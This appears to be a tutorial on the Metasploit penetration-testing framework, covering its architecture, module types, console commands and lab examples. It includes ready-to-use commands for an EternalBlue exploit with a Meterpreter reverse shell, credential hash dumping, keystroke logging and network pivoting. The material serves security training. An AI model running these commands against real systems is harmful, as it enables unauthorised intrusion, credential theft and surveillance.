## Introduction to Metasploit Framework

The Metasploit Framework is one of the most powerful and widely used penetration testing tools available today. Created by H.D. Moore in 2003, it has evolved into a comprehensive platform that security professionals use to find, exploit, and validate vulnerabilities in various systems and applications.

![Metasploit Framework Console](https://www.imperva.com/learn/wp-content/uploads/sites/13/2022/04/Screen-Shot-2022-04-03-at-14.41.09.png)

Metasploit provides a structured environment for penetration testing with a vast collection of exploit code, payload generators, and auxiliary modules designed to streamline security assessments.

## Metasploit Editions

Metasploit is available in several different editions to meet various needs:

1. **Metasploit Framework (MSF)** - The free, open-source core framework
2. **Metasploit Pro** - Commercial version with advanced features for enterprise use
3. **Metasploit Express** - A simplified commercial version (discontinued)
4. **Metasploit Community** - Free version with basic GUI interface

## Key Components and Architecture

The Metasploit Framework follows a modular architecture that makes it highly extensible and powerful.

### Core Components

```
+--------------------+     +--------------------+     +--------------------+
|      Libraries     | --> |       Core         | <-- |   User Interfaces  |
+--------------------+     +--------------------+     +--------------------+
                             ^         ^
                             |         |
                             v         v
             +--------------------+  +--------------------+
             |      Modules      |  |    Tools           |
             +--------------------+  +--------------------+
```

- **Rex**: The basic library for most tasks like handling sockets, protocols, text transformations, etc.
- **MSF Core**: Provides the API that modules are built against
- **MSF Base**: Extends the core with additional functionality
- **Interfaces**: Command line, console, web interfaces, and GUI
- **Modules**: The actual exploits, payloads, and auxiliary functionality
- **Tools**: Standalone tools that complement the framework

### Module Types

Metasploit organizes its functionality into different module types:

::: {.callout-important}
Understanding the different module types is crucial for effective penetration testing with Metasploit.
:::

#### Exploits

Exploits are pieces of code that take advantage of vulnerabilities in systems or applications.

```ruby
# Example structure of a simple Metasploit exploit module
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Example Vulnerable Service Exploit',
      'Description'    => %q{
        This module exploits a buffer overflow in Example Service.
      },
      'Author'         => ['Security Researcher'],
      'License'        => MSF_LICENSE,
      'Targets'        => [
        ['Windows 10', {'Ret' => 0x41414141}]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-01-01'
    ))
  end

  def check
    # Check if target is vulnerable
  end

  def exploit
    # Exploit code goes here
  end
end
```

#### Payloads

Payloads are code that runs after successful exploitation. Metasploit offers three types:

1. **Singles**: Self-contained payloads (add user, execute command)
2. **Stagers**: Establish a connection channel between attacker and victim
3. **Stages**: Downloaded by stagers to provide advanced features

![Metasploit Payload Types](https://www.hackthebox.com/storage/blog/RrYdoV7nYkaR9NdV6h263NRzMQ4SdGT5.jpg)

#### Auxiliary

Auxiliary modules perform standalone tasks like scanning, fuzzing, and information gathering.

#### Post-Exploitation

Post modules are used after successful exploitation to gather information, pivot to other systems, or maintain persistence.

#### Encoders

Encoders help evade antivirus detection and bypass character restrictions in exploits.

#### NOPs

NOP (No Operation) generators create NOP sleds for exploit reliability.

## Using Metasploit Framework

### Installation

Installing Metasploit is straightforward on most platforms:

```bash
# On Kali Linux, Metasploit comes pre-installed
# To update:
sudo apt update
sudo apt install metasploit-framework

# On other Linux distributions:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### Basic Workflow

The typical workflow using Metasploit involves these steps:

```mermaid
graph TD
    A[Reconnaissance] --> B[Vulnerability Scanning]
    B --> C[Select Exploit]
    C --> D[Configure Exploit]
    D --> E[Select Payload]
    E --> F[Configure Payload]
    F --> G[Execute Exploit]
    G --> H[Post-Exploitation]
    H --> I[Clean Up]
```

### MSFconsole Commands

MSFconsole is the main interface for Metasploit. Here are some essential commands:

| Command | Description |
|---------|-------------|
| `help` | Display help menu |
| `search` | Search for modules |
| `use` | Select a module to use |
| `info` | Display information about a module |
| `show options` | Show available options for current module |
| `set` | Set an option's value |
| `exploit` or `run` | Execute the selected module |
| `sessions` | List active sessions |
| `background` | Background the current session |
| `db_nmap` | Run Nmap scan and save to database |

::: {.callout-tip}
Use the `setg` command to set global options that persist across modules.
:::

## Practical Examples

### Example 1: Vulnerability Scanning with Metasploit

```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Initialize the MSF database
sudo msfdb init

# Start MSFconsole
sudo msfconsole

# Connect to the database
msf > db_connect msf:password@127.0.0.1/msf

# Perform a scan
msf > db_nmap -sV -p 1-10000 192.168.1.100

# List discovered hosts
msf > hosts

# List discovered services
msf > services
```

### Example 2: Exploiting a Vulnerable Service

This example demonstrates exploiting a vulnerable SMB service using the EternalBlue exploit:

```bash
# Search for the EternalBlue exploit
msf > search eternalblue

# Use the exploit
msf > use exploit/windows/smb/ms17_010_eternalblue

# Set the required options
msf > set RHOSTS 192.168.1.100
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.50

# Run the exploit
msf > exploit
```

### Example 3: Post-Exploitation with Meterpreter

Once you have a Meterpreter session, you can perform various post-exploitation activities:

```bash
# In an active Meterpreter session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > search -f *.pdf
meterpreter > migrate 1234
```

## Advanced Metasploit Techniques

### Custom Module Development

You can create custom modules for specialized needs:

1. Create a new Ruby file in the appropriate module directory
2. Define the module class and required methods
3. Set metadata like name, description, and authors
4. Implement the core functionality
5. Test and debug the module

### Using Resource Scripts

Resource scripts automate repetitive tasks in Metasploit:

```bash
# Create a resource script (automate.rc)
echo "use auxiliary/scanner/smb/smb_version" > automate.rc
echo "set RHOSTS 192.168.1.0/24" >> automate.rc
echo "run" >> automate.rc

# Run the resource script
msf > resource automate.rc
```

### Pivoting Through Networks

Metasploit allows pivoting through compromised hosts to reach otherwise inaccessible networks:

```bash
# In a Meterpreter session on a compromised host
meterpreter > run autoroute -s 10.0.0.0/24

# Back in MSF console
msf > use auxiliary/scanner/tcp/port
msf > set RHOSTS 10.0.0.10
msf > set PORTS 22,80,443
msf > run
```

## Integration with Other Tools

Metasploit works well with many other security tools:

### Nmap Integration

```bash
# Run Nmap scan and import results
msf > db_nmap -sV -p 1-10000 192.168.1.0/24

# Use scan results
msf > services -p 445
```

### Nexpose/Nessus Integration

```bash
# Import Nexpose scan
msf > nexpose_connect admin:password@127.0.0.1:3780
msf > nexpose_scan 192.168.1.0/24

# Import Nessus scan
msf > db_import /path/to/nessus_scan.nessus
```

### PowerShell Empire Integration

Metasploit can work alongside PowerShell Empire for advanced post-exploitation:

```bash
# Generate Empire stager using Metasploit
msf > use exploit/windows/local/powershell_empire_launcher
msf > set SESSION 1
msf > run
```
